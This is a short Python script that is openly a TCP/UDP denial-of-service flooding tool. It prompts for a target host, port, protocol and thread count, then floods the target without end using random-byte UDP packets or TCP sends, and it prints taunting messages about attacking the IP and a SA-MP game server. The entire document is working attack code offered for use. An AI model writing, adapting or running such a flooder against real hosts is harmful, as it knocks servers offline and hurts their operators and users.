#byzielx
import random 
import socket
import threading
import os , sys

os.system("clear") 
print ('''
╔═╗╦╔═╗╦  ═╗ ╦
╔═╝║║╣ ║  ╔╩╦╝
╚═╝╩╚═╝╩═╝╩ ╚═''')
print("#=======TCP UDP DDOS TOOLS============#                          ")
print("$=======AJARIN AKU JADI HENGKEL=======$                          ")
print("+=======Tools Codes By : ZieLx======+                          ")

choice = str(input(" UDP/TCP: "))
ip = str(input(" HOST/IP TARGET: "))
port = int(input(" PORT TARGET : "))
times = int(input(" TIMES : "))
threads = int(input(" THREADS : "))
os.system("clear")
def udp():
	data = random._urandom(900)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[91m ZieLx Attacking Ip %s \\033[91m And Port %s"%(ip,port))
		except:
			print("\033[91m SA-MP Server %s Has Been Maintenance %s"%(ip,port))
def tcp():
	data = random._urandom(3016)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()
			print("\033[91m  ZieLx Attacking Ip %s And Port %s"%(ip,port))

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()
